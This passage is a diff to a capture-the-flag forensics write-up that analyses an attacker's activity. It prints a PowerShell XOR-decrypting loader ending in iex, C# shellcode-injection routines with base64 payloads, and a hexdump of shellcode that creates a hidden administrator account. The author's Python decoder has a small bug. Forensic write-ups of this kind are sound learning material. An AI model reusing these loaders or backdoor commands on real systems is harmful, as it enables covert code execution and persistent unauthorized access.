@@ -248,7 +248,7 @@ done
 The attacker is gathering information on the system, the creators troll us with
 a fake flag ;)
 
-And then some ugly shellcode gets dropped:
+And then several ugly shellcode get dropped in temp files:
 
 ```csharp
 public byte[] ExecRuntime(){
@@ -258,6 +258,110 @@ public byte[] ExecRuntime(){
 }
 ```
 
+Those files get tampered:
+
+```csharp
+$ProgressPreference = "SilentlyContinue";
+$path_in_module="C:\Windows\Temp\x1fvogijp5pyzn7\tbyjzt4vw6y";
+$path_in_app_code="C:\Windows\Temp\x1fvogijp5pyzn7\3186q1r3kpvk";
+$key=[System.Text.Encoding]::UTF8.GetBytes('4d65bdbad183f00203b1e80cf96fba549663dabeab12fab153a921b346975cdd');
+$enc_module=[System.IO.File]::ReadAllBytes($path_in_module);
+$enc_app_code=[System.IO.File]::ReadAllBytes($path_in_app_code);
+$dec_module=New-Object Byte[] $enc_module.Length;
+$dec_app_code=New-Object Byte[] $enc_app_code.Length;
+for ($i = 0; $i -lt $enc_module.Length; $i++) {$dec_module[$i] = $enc_module[$i] -bxor $key[$i % $key.Length];};
+for ($i = 0; $i -lt $enc_app_code.Length; $i++) {$dec_app_code[$i] = $enc_app_code[$i] -bxor $key[$i % $key.Length];};
+$dec_module=[System.Text.Encoding]::UTF8.GetString($dec_module);$dec_app_code=[System.Text.Encoding]::UTF8.GetString($dec_app_code);
+$($dec_module+$dec_app_code)|iex;Remove-Item -Path $path_in_app_code -Force 2>&1 | Out-Null;
+```
+
+And also some ZIP data is sent:
+
+```csharp
+public byte[] ExecRuntime()
+{
+    string shellcodeBase64 = "H4sIABEPy10C/+S9eXxURfIA/uZKBpLwJsBgEJBBB4zGIzIi..."
+    byte[] shellcodeCompressed = Convert.FromBase64String(shellcodeBase64);
+    byte[] shellcodeByteArr = Decompress(shellcodeCompressed);
+    string threadParametersBase64 = "H4sIABEPy10C/3O2ignPzEvJLy+OCUnNLYipMEwry...";
+    byte[] threadParameters = {};
+    if(threadParametersBase64.Length > 0){
+        byte[] threadParametersCompressed = Convert.FromBase64String(threadParametersBase64);
+        threadParameters = Decompress(threadParametersCompressed);
+    }
+    string output_func=InjectShellcode(shellcodeByteArr, threadParameters, @"cmd.exe", 60000, 0x2880);
+    byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
+    return(output_func_byte);
+}
+```
+
+The first is a huge shellcode I won't display here and the parameters look like this:
+
+```
+00000000: 433a 5c57 696e 646f 7773 5c54 656d 705c 7831 6676 6f67 696a 7035 7079 7a6e 375c  C:\Windows\Temp\x1fvogijp5pyzn7\
+00000020: 396e 7538 7731 7100 6e6f 7465 7061 642e 6578 6500 7b34 3939 3164 3334 622d 3830  9nu8w1q.notepad.exe.{4991d34b-80
+00000040: 6131 2d34 3239 312d 3833 6236 2d33 3332 3833 3636 6239 3039 377d 0034 3832 3738  a1-4291-83b6-3328366b9097}.48278
+00000060: 0031 3237 2e30 2e30 2e31 0031 3335 0031 3237 2e30 2e30 2e31 0034 3032 00fc 4883  .127.0.0.1.135.127.0.0.1.402..H.
+00000080: e4f0 e8c0 0000 0041 5141 5052 5156 4831 d265 488b 5260 488b 5218 488b 5220 488b  .......AQAPRQVH1.eH.R`H.R.H.R H.
+000000a0: 7250 480f b74a 4a4d 31c9 4831 c0ac 3c61 7c02 2c20 41c1 c90d 4101 c1e2 ed52 4151  rPH..JJM1.H1..<a|., A...A....RAQ
+000000c0: 488b 5220 8b42 3c48 01d0 8b80 8800 0000 4885 c074 6748 01d0 508b 4818 448b 4020  H.R .B<H........H..tgH..P.H.D.@ 
+000000e0: 4901 d0e3 5648 ffc9 418b 3488 4801 d64d 31c9 4831 c0ac 41c1 c90d 4101 c138 e075  I...VH..A.4.H..M1.H1..A...A..8.u
+00000100: f14c 034c 2408 4539 d175 d858 448b 4024 4901 d066 418b 0c48 448b 401c 4901 d041  .L.L$.E9.u.XD.@$I..fA..HD.@.I..A
+00000120: 8b04 8848 01d0 4158 4158 5e59 5a41 5841 5941 5a48 83ec 2041 52ff e058 4159 5a48  ...H..AXAX^YZAXAYAZH.. AR..XAYZH
+00000140: 8b12 e957 ffff ff5d 48ba 0100 0000 0000 0000 488d 8d01 0100 0041 ba31 8b6f 87ff  ...W...]H.........H......A.1.o..
+00000160: d5bb f0b5 a256 41ba a695 bd9d ffd5 4883 c428 3c06 7c0a 80fb e075 05bb 4713 726f  .....VA.......H..(<.|....u..G.ro
+00000180: 6a00 5941 89da ffd5 636d 6420 2f63 2022 6e65 7420 7573 6572 202f 6164 6420 6164  j.YA....cmd /c "net user /add ad
+000001a0: 6d69 6e5f 696e 6669 6e69 7479 2022 2250 6173 7377 6f72 6432 2122 2220 2f59 2026  min_infinity ""Password2!"" /Y &
+000001c0: 206e 6574 206c 6f63 616c 6772 6f75 7020 4164 6d69 6e69 7374 7261 746f 7273 2061   net localgroup Administrators a
+000001e0: 646d 696e 5f69 6e66 696e 6974 7920 2f61 6464 2026 2065 6368 6f20 7847 6b38 395f  dmin_infinity /add & echo xGk89_
+00000200: 4577 203e 2043 3a5c 786f 722e 6b22 00                                            Ew > C:\xor.k".
+```
+
+My guess is this is a hint: this XOR key is somehow linked to the user "admin_infinity".
+
+The first shellcode & parameters were readable after decompression, while this
+one is not:
+
+```csharp
+public byte[] ExecRuntime()
+{
+    string shellcodeBase64 = "H4sIACYPy10C//vj0fzkw4sjDAwMjoGOAUGBYR6Gl1I9uoMSgFgCiBU8uosCPPi3e3n5Gp70MDywxiaxhklHwfHgSV5HxoOP3gY5BoJUdTvZeDBeSGuskOBmKs3rbugAGujReqAkGSga0O0h4dLtoODJeOFxkMf/k47dJh0ejNeg5kFNsnhQ+tGH2UeFw9XyYumNCKB6FaD6NMduHg8gWwbIduxmAWq74BjhGBEXGQWkIh2jHIP+PwAyojy6hV4G////P9aj+Y2Dx3EXFQOg/QxAWgNKKzADaVfDk447GIGMXUDc4NHbmwnkOO669e2W//+rHp0uKmCtCiAtPr29kSDJHRwgj/ROTQRyPLp9VBwcd62dF78bqBzCOTatPQjEaQUp2CkAUVwEUmzI5NF8iOPR99eSDGgg2SqmIr9IL5thcqAR52u5/26fNd4cfyNess/yr9pOpa+7Fk1YNOX4MRsN4TAl4VjJArVwWRXmcElxQVNmxqgwXmNNPnW7aN80G3N3bpOImDRtXRd1Jf54rjqLcLd0DaZUDR1JGQ0Z71RtBSkOaaaweDNtOR47k9hYCwVtOW2ueHFtW+YKAF6+IH71AQAA";
+    byte[] shellcodeCompressed = Convert.FromBase64String(shellcodeBase64);
+    byte[] shellcodeByteArr = Decompress(shellcodeCompressed);
+    string threadParametersBase64 = "";
+    byte[] threadParameters = {};
+    if(threadParametersBase64.Length > 0){
+        byte[] threadParametersCompressed = Convert.FromBase64String(threadParametersBase64);
+        threadParameters = Decompress(threadParametersCompressed);
+    }
+    string output_func=InjectShellcodeAs(shellcodeByteArr, threadParameters, @"136", 0, 0, "admin_infinity", "Password2!");
+    byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
+    return(output_func_byte);
+}
+```
+
+Also the "admin_infinity" user appears, so it may have significance!
+
+Let's decode the shellcode and use the XOR key on it:
+
+```shell
+echo -n H4sIACYPy10C//vj0fzkw4sjDAwMjoGOAUGBYR6Gl1I9uoMSgFgCiBU8uosCPPi3e3n5Gp70MDywxiaxhklHwfHgSV5HxoOP3gY5BoJUdTvZeDBeSGuskOBmKs3rbugAGujReqAkGSga0O0h4dLtoODJeOFxkMf/k47dJh0ejNeg5kFNsnhQ+tGH2UeFw9XyYumNCKB6FaD6NMduHg8gWwbIduxmAWq74BjhGBEXGQWkIh2jHIP+PwAyojy6hV4G////P9aj+Y2Dx3EXFQOg/QxAWgNKKzADaVfDk447GIGMXUDc4NHbmwnkOO669e2W//+rHp0uKmCtCiAtPr29kSDJHRwgj/ROTQRyPLp9VBwcd62dF78bqBzCOTatPQjEaQUp2CkAUVwEUmzI5NF8iOPR99eSDGgg2SqmIr9IL5thcqAR52u5/26fNd4cfyNess/yr9pOpa+7Fk1YNOX4MRsN4TAl4VjJArVwWRXmcElxQVNmxqgwXmNNPnW7aN80G3N3bpOImDRtXRd1Jf54rjqLcLd0DaZUDR1JGQ0Z71RtBSkOaaaweDNtOR47k9hYCwVtOW2ueHFtW+YKAF6+IH71AQAA |
+    base64 -d | gunzip -d > payloads/shellcode.bin
+```
+
+```python
+from itertools import cycle
+
+KEY = '9_EwxGk8'.decode('utf-8')
+
+def decrypt_xor(data, key=KEY):
+    return bytes([x ^ y for (x, y) in zip(data, cycle(key))])
+
+with open('payloads/shellcode.bin', 'rb') as __f:
+    DATA = __f.read()
+
+print(decrypt_xor(DATA, KEY))
+```
 
 [author-profile-1]: https://app.hackthebox.com/users/19456
 [author-profile-2]: https://app.hackthebox.com/users/3603
